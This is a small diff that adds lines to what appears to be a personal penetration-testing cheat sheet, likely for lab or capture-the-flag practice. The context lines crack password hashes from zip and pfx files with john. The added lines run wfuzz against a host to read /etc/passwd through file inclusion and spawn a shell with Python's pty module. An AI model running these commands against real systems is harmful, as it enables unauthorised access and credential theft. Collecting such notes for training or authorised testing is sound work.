@@ -65,4 +65,15 @@ john --wordlist=/usr/share/wordlists/rockyou.txt zipHash.john
 pfx2john legacyy_dev_auth.pfx > pfxHash.john
 ```
 
+```
+wfuzz -u http://192.168.237.104/file.php?FUZZ=/etc/passwd --hw 14 -w /usr/share/wordlists/dirb/big.txt
+```
+
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
 
